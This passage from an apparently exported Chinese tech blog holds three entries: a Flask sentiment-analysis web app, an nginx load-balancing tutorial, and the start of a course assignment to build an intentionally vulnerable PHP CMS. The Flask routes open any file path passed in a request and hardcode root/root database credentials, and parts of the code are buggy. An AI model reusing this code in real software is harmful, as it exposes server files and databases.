								<span class="hljs-attr">shadeClose</span>: <span class="hljs-literal">false</span>,
								<span class="hljs-attr">time</span>: <span class="hljs-number">60000</span>
							&#125;);
						&#125;,
						<span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>) &#123;
							<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;初始化&#x27;</span>)
							layer.<span class="hljs-title function_">close</span>(loadingFlag);
							myCharts2.<span class="hljs-title function_">setOption</span>(&#123;
								<span class="hljs-attr">tooltip</span>: &#123;
									<span class="hljs-attr">show</span>: <span class="hljs-literal">true</span>
								&#125;,
								<span class="hljs-attr">series</span>: [&#123;
									<span class="hljs-attr">type</span>: <span class="hljs-string">&quot;wordCloud&quot;</span>,
									<span class="hljs-attr">gridSize</span>: <span class="hljs-number">6</span>,
									<span class="hljs-attr">shape</span>: <span class="hljs-string">&#x27;diamond&#x27;</span>,
									<span class="hljs-attr">sizeRange</span>: [<span class="hljs-number">12</span>, <span class="hljs-number">50</span>],
									<span class="hljs-attr">width</span>: <span class="hljs-number">800</span>,
									<span class="hljs-attr">height</span>: <span class="hljs-number">500</span>,
									<span class="hljs-attr">textStyle</span>: &#123;
										<span class="hljs-attr">normal</span>: &#123;
											<span class="hljs-attr">color</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;
												<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rgb(&#x27;</span> + [
													<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">160</span>),
													<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">160</span>),
													<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">160</span>)
												].<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;,&#x27;</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;
											&#125;
										&#125;,
										<span class="hljs-attr">emphasis</span>: &#123;
											<span class="hljs-attr">shadowBlur</span>: <span class="hljs-number">10</span>,
											<span class="hljs-attr">shadowColor</span>: <span class="hljs-string">&#x27;#333&#x27;</span>
										&#125;
									&#125;,
									<span class="hljs-attr">data</span>: res.<span class="hljs-property">data</span>,
								&#125;]
							&#125;);</code></pre>



<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808174107761.png" alt="image-20210808174107761" style="zoom: 67%;">

<h2 id="评论检测"><a href="#评论检测" class="headerlink" title="评论检测"></a>评论检测</h2><p>当用户输入检测文本，系统会调用训练好的模型对文本进行情感分析，并将得到的结果写入数据库，之后在页面中显示</p>
<p>python代码</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/data1&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">data1</span>():
    path = <span class="hljs-built_in">str</span>(request.args[<span class="hljs-string">&#x27;path&#x27;</span>])
    data = []
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(path)==<span class="hljs-number">0</span>):
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
            reader = f.readlines()
            rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rows:
            result = analyzer.analyze(i)  // 调用已经封装好的模型对提交的文本进行检测，返回结果
            d = &#123;<span class="hljs-string">&quot;content&quot;</span>:i,<span class="hljs-string">&quot;result&quot;</span>:result&#125;
            data.append(d)
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;
    <span class="hljs-keyword">return</span> jsonify(table_result)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ksh&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">ksh</span>():
    path = <span class="hljs-built_in">str</span>(request.args[<span class="hljs-string">&#x27;path&#x27;</span>])
    good = <span class="hljs-number">0</span>
    bad = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(path)==<span class="hljs-number">0</span>):
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
            reader = f.readlines()
            rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rows:
            result = analyzer.analyze(i)
            <span class="hljs-keyword">if</span>(result == <span class="hljs-string">&quot;好评&quot;</span>):
                good+=<span class="hljs-number">1</span>
            <span class="hljs-keyword">else</span>:
                bad+=<span class="hljs-number">1</span>
        table_result = &#123;<span class="hljs-string">&quot;good&quot;</span>: good, <span class="hljs-string">&quot;bad&quot;</span>: bad&#125;
    <span class="hljs-keyword">return</span> jsonify(table_result)
</code></pre>

<p>js脚本</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> insTb = table.<span class="hljs-title function_">render</span>(&#123;
	<span class="hljs-attr">elem</span>: <span class="hljs-string">&#x27;#tableUser&#x27;</span>,
	<span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://127.0.0.1:5000/data&#x27;</span>,
	<span class="hljs-attr">height</span>: <span class="hljs-string">&#x27;full-250&#x27;</span>,
	<span class="hljs-attr">page</span>: <span class="hljs-literal">true</span>,
	<span class="hljs-attr">toolbar</span>: <span class="hljs-literal">true</span>,
	<span class="hljs-attr">cellMinWidth</span>: <span class="hljs-number">100</span>,
	<span class="hljs-attr">cols</span>: [
		[&#123;
				<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;numbers&#x27;</span>,
				<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;#&#x27;</span>
			&#125;,

			&#123;
				<span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;content&#x27;</span>,
				<span class="hljs-attr">sort</span>: <span class="hljs-literal">true</span>,
				<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;内容&#x27;</span>
			&#125;,
			&#123;
				<span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;type&#x27;</span>,
				<span class="hljs-attr">sort</span>: <span class="hljs-literal">true</span>,
				<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;分类&#x27;</span>,
				<span class="hljs-attr">width</span>:<span class="hljs-number">200</span>,
				<span class="hljs-attr">templet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">d</span>)&#123;
					<span class="hljs-keyword">if</span>(d.<span class="hljs-property">TYPE</span> == <span class="hljs-number">1</span>)&#123;
						<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;好评&#x27;</span>
					&#125;<span class="hljs-keyword">else</span>&#123;
						<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;差评&#x27;</span>
					&#125;
  							&#125;
			&#125;
		]
	]
&#125;);</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175218340.png" alt="image-20210808175218340"></p>
<h2 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h2><p>批量检测是将多条评论写入txt文件中，实现一次检测多条评论，然后将数据显示在页面中，并呈现可视化结果</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/data&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">data</span>():
    limit = <span class="hljs-built_in">int</span>(request.args[<span class="hljs-string">&#x27;limit&#x27;</span>])
    page = <span class="hljs-built_in">int</span>(request.args[<span class="hljs-string">&#x27;page&#x27;</span>])
    page = (page-<span class="hljs-number">1</span>)*limit
    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,
                           charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)
    cursor = conn.cursor()
    cursor.execute(<span class="hljs-string">&quot;select count(*) from `result`&quot;</span>);
    count = cursor.fetchall()
    cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)
    cursor.execute(<span class="hljs-string">&quot;select * from `result` limit &quot;</span>+<span class="hljs-built_in">str</span>(page)+<span class="hljs-string">&quot;,&quot;</span>+<span class="hljs-built_in">str</span>(limit));
    data_dict = []
    result = cursor.fetchall()
    <span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> result:
        data_dict.append(field)
    table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: count[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;data&quot;</span>: data_dict&#125;
    cursor.close()
    conn.close()
    <span class="hljs-keyword">return</span> jsonify(table_result)</code></pre>

<p>js脚本</p>
<pre><code class="hljs js">upload.<span class="hljs-title function_">render</span>(&#123; <span class="hljs-comment">//允许上传的文件后缀</span>
					<span class="hljs-attr">elem</span>: <span class="hljs-string">&#x27;#test_upload&#x27;</span>,
					<span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://127.0.0.1:5000/upload&#x27;</span>,
					<span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;myfile&#x27;</span>,
					<span class="hljs-attr">accept</span>: <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-comment">//普通文件		</span>
					<span class="hljs-attr">exts</span>: <span class="hljs-string">&#x27;txt&#x27;</span>, <span class="hljs-comment">//只允许上传txt文件	</span>
					<span class="hljs-attr">before</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) &#123; <span class="hljs-comment">//obj参数包含的信息，跟 choose回调完全一致，可参见上文。</span>
						layer.<span class="hljs-title function_">load</span>(); <span class="hljs-comment">//上传loading</span>
					&#125;,
					<span class="hljs-attr">done</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>) &#123;
						layer.<span class="hljs-title function_">closeAll</span>(<span class="hljs-string">&#x27;loading&#x27;</span>);
						layer.<span class="hljs-title function_">msg</span>(<span class="hljs-string">&#x27;上传成功&#x27;</span>);
						<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)
						path = res.<span class="hljs-property">path</span>
						insTb.<span class="hljs-title function_">reload</span>(&#123;
							<span class="hljs-attr">where</span>: &#123;
								<span class="hljs-string">&#x27;path&#x27;</span>: path
							&#125;
						&#125;);
						$.<span class="hljs-title function_">ajax</span>(&#123;
							<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,
							<span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://127.0.0.1:5000/ksh&#x27;</span>,
							<span class="hljs-attr">data</span>: &#123;
								<span class="hljs-string">&#x27;path&#x27;</span>: path
							&#125;,
							<span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) &#123;
								<span class="hljs-keyword">var</span> option = &#123;
									<span class="hljs-attr">tooltip</span>: &#123;
										<span class="hljs-attr">trigger</span>: <span class="hljs-string">&#x27;item&#x27;</span>,
										<span class="hljs-attr">formatter</span>: <span class="hljs-string">&#x27;&#123;a&#125; &lt;br/&gt;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)&#x27;</span>
									&#125;,
									<span class="hljs-attr">legend</span>: &#123;
										<span class="hljs-attr">orient</span>: <span class="hljs-string">&#x27;vertical&#x27;</span>,
										<span class="hljs-attr">left</span>: <span class="hljs-string">&#x27;left&#x27;</span>,
										<span class="hljs-attr">data</span>: [<span class="hljs-string">&#x27;有效评论&#x27;</span>, <span class="hljs-string">&#x27;垃圾评论&#x27;</span>]
									&#125;,
									<span class="hljs-attr">series</span>: [&#123;
										<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;评论比例&#x27;</span>,
										<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;pie&#x27;</span>,
										<span class="hljs-attr">radius</span>: <span class="hljs-string">&#x27;55%&#x27;</span>,
										<span class="hljs-attr">center</span>: [<span class="hljs-string">&#x27;50%&#x27;</span>, <span class="hljs-string">&#x27;60%&#x27;</span>],
										<span class="hljs-attr">data</span>: [&#123;
												<span class="hljs-attr">value</span>: result.<span class="hljs-property">good</span>,
												<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;有效评论&#x27;</span>
											&#125;,
											&#123;
												<span class="hljs-attr">value</span>: result.<span class="hljs-property">bad</span>,
												<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;垃圾评论&#x27;</span>
											&#125;
										],
										<span class="hljs-attr">emphasis</span>: &#123;
											<span class="hljs-attr">itemStyle</span>: &#123;
												<span class="hljs-attr">shadowBlur</span>: <span class="hljs-number">10</span>,
												<span class="hljs-attr">shadowOffsetX</span>: <span class="hljs-number">0</span>,
												<span class="hljs-attr">shadowColor</span>: <span class="hljs-string">&#x27;rgba(0, 0, 0, 0.5)&#x27;</span>
											&#125;
										&#125;
									&#125;]
								&#125;;
								myCharts.<span class="hljs-title function_">setOption</span>(option)
							&#125;
						&#125;);</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175245654.png" alt="image-20210808175245654"></p>
<p>最后呈现的效果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175722246.png" alt="image-20210808175722246"></p>
<p>参考：</p>
<blockquote>
<p><a href="https://github.com/NTDXYG/ProjectsForChineseGraduates">https://github.com/NTDXYG/ProjectsForChineseGraduates</a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>朴素贝叶斯</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx</title>
    <url>/2022/07/24/nginx/</url>
    <content><![CDATA[<h1 id="Nginx负载均衡配置"><a href="#Nginx负载均衡配置" class="headerlink" title="Nginx负载均衡配置"></a>Nginx负载均衡配置</h1><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220724181955601.png" alt="image-20220724181955601"></p>
<h2 id="将java项目打包并启动"><a href="#将java项目打包并启动" class="headerlink" title="将java项目打包并启动"></a>将java项目打包并启动</h2><p>这里为了有效果，打包了两份，当访问接口时，控制台打印不同的日志</p>
<pre><code class="hljs sh">java -jar .\api-2.0.1-8081.jar --server.port=8081
java -jar .\api-2.0.1-8082.jar --server.port=8082</code></pre>

<h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><pre><code class="hljs awk"><span class="hljs-comment">#user  nobody;</span>
worker_processes <span class="hljs-number">4</span>;

<span class="hljs-comment">#pid        logs/nginx.pid;</span>
events &#123;
     worker_connections <span class="hljs-number">40960</span>;
&#125;

http &#123;
    include       mime.types;
    default_type  application/octet-stream;
    <span class="hljs-comment">#access_log  logs/access.log  main;</span>
     sendfile  on;
    <span class="hljs-comment">#tcp_nopush     on;</span>

    <span class="hljs-comment">#keepalive_timeout  0;</span>
     keepalive_timeout <span class="hljs-number">65</span>;

    <span class="hljs-comment">#gzip  on;</span>

    upstream myservice &#123;
        server <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>;
	    server <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>;
	    <span class="hljs-comment"># server 127.0.0.1:8847;</span>
    &#125;

    server &#123;
    listen       <span class="hljs-number">80</span>;
    server_name  localhost;

    location / &#123;
        proxy_pass http:<span class="hljs-regexp">//my</span>service;
        &#125;
    &#125;

	<span class="hljs-comment">#include vhosts.conf;</span>
    map <span class="hljs-variable">$time_iso8601</span> <span class="hljs-variable">$logdate</span> &#123;
        <span class="hljs-string">&#x27;~^(?&lt;ymd&gt;\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;)&#x27;</span> <span class="hljs-variable">$ymd</span>;
        default                       <span class="hljs-string">&#x27;date-not-found&#x27;</span>;
    &#125;
	include vhosts/*.conf;

	 client_max_body_size  <span class="hljs-number">50</span>m;
     client_body_buffer_size <span class="hljs-number">60</span>k;
     client_body_timeout <span class="hljs-number">60</span>;
     client_header_buffer_size <span class="hljs-number">64</span>k;
     client_header_timeout <span class="hljs-number">60</span>;
     error_page <span class="hljs-number">400</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">400</span>.html;
     error_page <span class="hljs-number">403</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">403</span>.html;
     error_page <span class="hljs-number">404</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">404</span>.html;
     error_page <span class="hljs-number">500</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">500</span>.html;
     error_page <span class="hljs-number">501</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">501</span>.html;
     error_page <span class="hljs-number">502</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">502</span>.html;
     error_page <span class="hljs-number">503</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">503</span>.html;
     error_page <span class="hljs-number">504</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">504</span>.html;
     error_page <span class="hljs-number">505</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">505</span>.html;
     error_page <span class="hljs-number">506</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">506</span>.html;
     error_page <span class="hljs-number">507</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">507</span>.html;
     error_page <span class="hljs-number">509</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">509</span>.html;
     error_page <span class="hljs-number">510</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">510</span>.html;
     
     keepalive_requests <span class="hljs-number">100</span>;
     large_client_header_buffers <span class="hljs-number">4</span> <span class="hljs-number">64</span>k;
     reset_timedout_connection on;
     send_timeout <span class="hljs-number">60</span>;
     sendfile_max_chunk <span class="hljs-number">512</span>k;
     server_names_hash_bucket_size <span class="hljs-number">256</span>;
&#125;
     worker_rlimit_nofile <span class="hljs-number">100000</span>;
</code></pre>

<p>主要配置内容为</p>
<pre><code class="hljs nginx"><span class="hljs-section">upstream</span> myservice &#123;
    <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8081</span>;
 <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8083</span>;
 <span class="hljs-comment"># server 127.0.0.1:8847;</span>
&#125;

<span class="hljs-section">server</span> &#123;
<span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;
<span class="hljs-attribute">server_name</span>  localhost;

<span class="hljs-section">location</span> / &#123;
    <span class="hljs-attribute">proxy_pass</span> http://myservice;
    &#125;
&#125;
</code></pre>

<p>启动nginx即可</p>
<p>**当启动ngin没反应时，多半是配置文件有问题，可以直接拷贝正确的配置后修改</p>
<h1 id="Nginx负载均衡策略"><a href="#Nginx负载均衡策略" class="headerlink" title="Nginx负载均衡策略"></a>Nginx负载均衡策略</h1><blockquote>
<p>前端&#x2F;用户所有对Tomcat(应用服务器)的请求都是通过Nginx转发的:<br>用户请求发送到nginx，nginx转发的对应的服务器，一个集群中有多个服务器节点，那么Nginx怎么确定转发到哪个服务器节点呢?<br>Nginx提供了四种负载均衡策略，同时也支持配置第三方的负载均衡策略。</p>
</blockquote>
<h2 id="轮询"><a href="#轮询" class="headerlink" title="轮询"></a>轮询</h2><blockquote>
<p>根据用户的请求交替的发送到每个服务器节点，是nginx默认的负载均衡策略</p>
</blockquote>
<pre><code class="hljs properties"><span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 max_fails=3 fail_timeout 20s fail_time=100s;</span>
<span class="hljs-comment">    # 如果在20s内失败了三次 则让该服务器停止100s</span>
 <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>
 <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span>
 <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8084 backup; </span>
<span class="hljs-comment"> # 备用机</span>
 <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8085 down;</span>
<span class="hljs-comment"> # 该服务器永远都用不上</span>
<span class="hljs-attr">&#125;</span></code></pre>

<ul>
<li>max_fails设置在fail_timeout参数设置的时间内最大失败次数，如果在这个时间内，所有针对该服务器的请求都失败了，那么认为该服务器会被认为是停机了</li>
<li>fail_timeout 与max_fails结合使用</li>
<li>fail_time服务器会被认为停机的时间长度,默认为10s</li>
<li>backup标记该服务器为备用服务器,当主服务器停止时，请求会被发送到它这里</li>
<li>down标记服务器永久停机了</li>
</ul>
<h2 id="权重"><a href="#权重" class="headerlink" title="权重"></a>权重</h2><pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>
       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span>
<span class="hljs-attr">&#125;</span></code></pre>

<ul>
<li>权重方式，在轮询策略的基础上指定轮询的几率(根据服务器性能和资源情况设置对应权重比)</li>
<li>weight参数用于指定轮询几率,weight的默认值为1，weight的数值与访问比率成正比</li>
<li>权重越高分配到需要处理的请求越多</li>
<li>此策略比较适合服务器的硬件配置差别比较大的情况</li>
</ul>
<h2 id="ip-hash"><a href="#ip-hash" class="headerlink" title="ip_hash"></a>ip_hash</h2><p>指定负载均衡器按照基于客户端IP的分配方式，这个方法确保了相同的客户端的请求一直发送到相同的服务器，以保证session会话。这样每个访客都固定访问一个后端服务器，可以解决session不能跨服务器的问题。</p>
<pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>
 	    <span class="hljs-attr">ip_hash;</span>  <span class="hljs-string"># 保证每个用户固定访问同一个后端服务器</span>
       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span>
<span class="hljs-attr">&#125;</span></code></pre>



<h2 id="least-conn"><a href="#least-conn" class="headerlink" title="least _conn"></a>least _conn</h2><p>把请求转发给连接数较少的后端服务器。轮询算法是把请求平均的转发给各个后端，使它们的负载大致相同;但是，有些请求占用的时间很长，会导致其所在的后端负载较高。这种情况下，least _conn这种方式就可以达到更好的负载均衡效果。</p>
<pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>
 	    <span class="hljs-attr">least</span> <span class="hljs-string">_conn;  # 把请求转发到连接数较少的fu</span>
       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span>
<span class="hljs-attr">&#125;</span></code></pre>

]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>mycms</title>
    <url>/2021/03/21/mycms/</url>
    <content><![CDATA[<p>网络安全与攻击实验课程作业</p>
<span id="more"></span>

<p>[TOC]</p>
<h1 id="课程要求"><a href="#课程要求" class="headerlink" title="课程要求"></a>课程要求</h1><p>基于 Linux 操作系统（如 Ubuntu），使用 Docker 容器，选择一门自己擅长的语言（只能从 PHP、JAVA、Python 中选择）及其当前流行的开发框架（如 Java 的 Struts2、Spring、Hibernate，Python的 Django、flask，PHP 的 ThinkPHP 等） 开发一个 Web 应用系统。</p>
<p>具体要求：</p>
<blockquote>
<p>1）该系统需内置典型的 Web 漏洞（不少于 10 种，每种可有多个）。必须包含 SQL 注入、XSS、文件上传、文件包含、命令执行、XXE和反序列化。 </p>
<p>2）基于 Docker 容器发布系统，并完成内置典型漏洞的攻击过程。</p>
<p>3）将原有漏洞页面进行完善（不能直接在原有漏洞页面修改，需重新创建修复漏洞的页面）以修复所有漏洞，并通过测试证明漏</p>
<p>洞已经修复。</p>
</blockquote>
<h1 id="网站开发"><a href="#网站开发" class="headerlink" title="网站开发"></a>网站开发</h1><h2 id="1-开发工具"><a href="#1-开发工具" class="headerlink" title="1.开发工具"></a>1.开发工具</h2><p>phpstorm+vscode</p>
<p>phpstorm 重要用于对php代码的代码编写和修改，其提供了十分丰富的功能，帮助开发者快速修改代码，提供代码定位，能够快速的定位到某个函数所属文件，大大提高了工作效率。</p>
<p>而vscode则负责查看文件内容，其相对于PHP storm比较轻量，占用内存小，速度快。</p>
<h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2.环境搭建"></a>2.环境搭建</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>使用docker以及docker-compose</p>
<p>具体为mysql 5.6 + nginx +php7.1</p>
<p>其中docker-compose.yml</p>
<pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">nginx:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">hub.c.163.com/library/nginx:latest</span>
  	 <span class="hljs-comment"># 下载镜像的源，这里选择网易的镜像源，可以提高下载的速度， latest是最新版本</span>
    <span class="hljs-attr">ports:</span> 
      <span class="hljs-bullet">-</span> <span class="hljs-number">80</span><span class="hljs-string">:80</span>
     <span class="hljs-comment"># 端口映射</span>
      <span class="hljs-bullet">-</span> <span class="hljs-number">443</span><span class="hljs-string">:443</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx/nginx.conf:/etc/nginx/nginx.conf</span>
      <span class="hljs-comment">#nginx的配置文件路径</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx/conf.d:/etc/nginx/conf.d</span>
     <span class="hljs-comment"># 其他的配置文件</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/var/www</span>
      <span class="hljs-comment">#目录映射  src作为网站的根目录，网站的所有文件需要放在这里</span>
  <span class="hljs-attr">php:</span>
    <span class="hljs-attr">build:</span> <span class="hljs-string">./php</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/var/www</span>
      <span class="hljs-comment">#根目录</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./php/php.ini:/usr/local/etc/php/php.ini</span>
      <span class="hljs-comment"># php的配置文件</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./php/php-fpm.conf:/usr/local/etc/php-fpm.d/www.conf</span> 
  <span class="hljs-attr">mysql:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">hub.c.163.com/library/mysql:5.6</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/data:/var/lib/mysql</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/my.cnf:/etc/mysql/conf.d/my.cnf</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/init:/docker-entrypoint-initdb.d/</span>
      <span class="hljs-comment"># 这里需要初始化一个数据库</span>
    <span class="hljs-attr">ports:</span> 
      <span class="hljs-bullet">-</span> <span class="hljs-number">3306</span><span class="hljs-string">:3306</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_ROOT_PASSWORD=root</span>
     <span class="hljs-comment"># mysql数据库的密码</span>
</code></pre>

<p>其余配置文件可以根据需要从网上获取。</p>
<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>搭建目的是测试使用，方便重新搭建和数据管理，为再linux上搭建做好准备</p>
<p>课程要求使用docker搭建运行环境，但是Linux系统是虚拟机搭建的，里面没有好用的phpStrom，所以先在windows上搭建，试试水。</p>
<p>工具使用phpstduy2018，apache+php7.1</p>
<ul>
